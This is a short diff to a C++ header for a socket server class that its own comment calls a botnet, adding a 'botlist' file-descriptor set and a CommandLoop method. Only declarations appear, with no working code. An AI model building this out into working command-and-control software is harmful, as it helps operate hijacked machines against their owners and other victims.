@@ -10,6 +10,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <vector>
+#include <sys/select.h>
 
 /*
 **	Server class
@@ -18,12 +20,20 @@
 class Network {
 
 	private:
-		int					sockfd;
-		struct sockaddr_in	sockaddr;
+		int						sockfd;
+		int						fd_max;
+		struct sockaddr_in		sockaddr;
+		std::vector<int>		port_list;
+		fd_set					botlist;
+		
+
 	public:
 		Network(int port_number);			// initalize botnet.
 		~Network(void);						// close main socket.
-		void error_and_exit(std::string);	// print error message and exit
+		void ErrorAndExit(std::string);	// print error message and exit
+		void ZeroBotlist(void);
+		void CommandLoop(void);
+
 };
 
 
